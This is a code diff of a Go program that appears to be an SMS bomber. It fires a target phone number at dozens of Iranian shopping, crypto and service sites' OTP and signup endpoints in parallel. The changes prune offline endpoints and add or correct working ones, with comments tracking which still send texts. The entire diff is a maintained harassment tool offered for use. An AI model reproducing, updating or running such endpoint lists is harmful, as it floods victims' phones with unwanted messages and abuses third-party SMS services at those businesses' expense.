@@ -159,12 +159,6 @@ func main() {
 		go sms("https://mobapi.banimode.com/api/v2/auth/request", map[string]interface{}{
 			"phone": phone,
 		}, ch)    //active✅
-		go sms("https://3tex.io/api/1/users/validation/mobile", map[string]interface{}{
-			"receptorPhone": phone,
-		}, ch)  //ofline site = error 504
-		go sms("https://deniizshop.com/api/v1/sessions/login_request", map[string]interface{}{
-			"mobile_phone": phone,
-		}, ch)  // error site = not registry
 		go sms("https://flightio.com/bff/Authentication/CheckUserKey", map[string]interface{}{
 			"userKey": phone,
 		}, ch)   // just check
@@ -212,7 +206,7 @@ func main() {
  		go sms("https://lms.tamland.ir/api/api/user/signup", map[string]interface{}{
 			"mobile": phone,
 		}, ch)    // add site
- /////////////////////////////////////// site aparat should definitely be added.
+/////////////////////////////////////// site aparat should definitely be added.
 		go sms("https://account.bama.ir/api/otp/generate/v4", map[string]interface{}{
 			"username": phone,
 		}, ch)  // edit :4/22/2025
@@ -279,54 +273,42 @@ func main() {
 		go sms("https://core.pishkhan24.ayantech.ir/webservices/core.svc/v1/LoginByOTP", map[string]interface{}{
 			"Username": phone,
 		}, ch)  // edit :4/22/2025
-		go sms("https://www.simkhanapi.ir/api/users/registerV2", map[string]interface{}{
+		go sms("https://simkhanapi.ir/api/users/registerV2", map[string]interface{}{
 			"mobileNumber": phone,
-		}, ch)
+		}, ch)  // edit :4/22/2025
 		go sms("https://sandbox.sibirani.ir/api/v1/user/invite", map[string]interface{}{
 			"username": phone,
-		}, ch)
-		go sms("https://shop.hyperjan.ir/api/users/manage", map[string]interface{}{
-			"mobile": phone,
-		}, ch)
-		go sms("https://hiword.ir/wp-json/otp-login/v1/login", map[string]interface{}{
-			"identifier": phone,
-		}, ch)
-		go sms("https://abantether.com/users/register/phone/send/", map[string]interface{}{
-			"phoneNumber": phone,
-		}, ch)
-		go sms("https://api.bit24.cash/api/v3/auth/check-mobile", map[string]interface{}{
-			"mobile": phone,
-		}, ch)
-		go sms("https://dicardo.com/main/sendsms", map[string]interface{}{
-			"phone": phone,
-		}, ch)
-		go sms("https://ghasedak24.com/user/ajax_register", map[string]interface{}{
+		}, ch) //i don't know
+		go sms("https://sandbox.sibirani.com/api/v1/developer/generator-inv-token", map[string]interface{}{
 			"username": phone,
-		}, ch)
+		}, ch)  // edit :4/22/2025
+		go sms("https://api.abantether.com/api/v2/auths/register/phone/send", map[string]interface{}{
+			"phone_number": phone,
+		}, ch)  // edit :4/22/2025
+		go sms("https://bit24.cash/auth/api/sso/v2/users/auth/register/send-code", map[string]interface{}{
+			"mobile": phone,
+		}, ch)  // edit :4/22/2025
+		go sms("https://dicardo.com/sendotp", map[string]interface{}{
+			"phone": phone,
+		}, ch)  // edit :4/22/2025
+		go sms("https://ghasedak24.com/user/otp", map[string]interface{}{
+			"mobile": phone,
+		}, ch)  // edit :4/22/2025
 		go sms("https://tikban.com/Account/LoginAndRegister", map[string]interface{}{
 			"CellPhone": phone,
-		}, ch)
-		go sms("https://www.digistyle.com/users/login-register/", map[string]interface{}{
-			"loginRegister[email_phone]": phone,
-		}, ch)
-		go sms("https://banankala.com/home/login", map[string]interface{}{
-			"Mobile": phone,
-		}, ch)
-		go sms("https://www.iranketab.ir/account/register", map[string]interface{}{
-			"UserName": phone,
-		}, ch)
-		go sms("https://ketabchi.com/api/v1/auth/requestVerificationCode", map[string]interface{}{
+		}, ch)  // edit :4/22/2025
+		go sms("https://tikban.com/Account/LoginAndRegister", map[string]interface{}{
 			"phoneNumber": phone,
-		}, ch)
+		}, ch)  // edit :4/22/2025
+		go sms("https://ketabchi.com/api/v1/auth/requestVerificationCodee", map[string]interface{}{
+			"phoneNumber": phone,
+		}, ch)  // edit :4/22/2025
 		go sms("https://www.offdecor.com/index.php?route=account/login/sendCode", map[string]interface{}{
 			"phone": phone,
-		}, ch)
-		go sms("https://exo.ir/index.php?route=account/mobile_login", map[string]interface{}{
-			"mobile_number": phone,
-		}, ch)
+		}, ch)  // edit :4/22/2025
 		go sms("https://shahrfarsh.com/Account/Login", map[string]interface{}{
-			"phoneNumber=": phone,
-		}, ch)
+			"phoneNumber": phone,
+		}, ch)  // edit :4/22/2025
 		go sms("https://takfarsh.com/wp-content/themes/bakala/template-parts/send.php", map[string]interface{}{
 			"phone_email": phone,
 		}, ch)
